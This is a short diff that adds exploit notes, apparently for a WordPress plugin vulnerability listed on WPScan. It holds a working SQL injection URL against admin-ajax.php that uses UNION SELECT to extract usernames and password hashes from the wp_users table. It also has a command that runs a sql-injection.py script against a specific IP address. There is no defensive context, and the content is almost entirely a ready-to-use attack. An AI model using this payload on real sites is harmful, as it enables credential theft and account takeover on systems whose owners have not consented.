@@ -1,0 +1,6 @@
+http://localhost/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
+
+https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad
+
+
+python3 ./sql-injection.py -T 202.202.0.6 -P 80 -U /
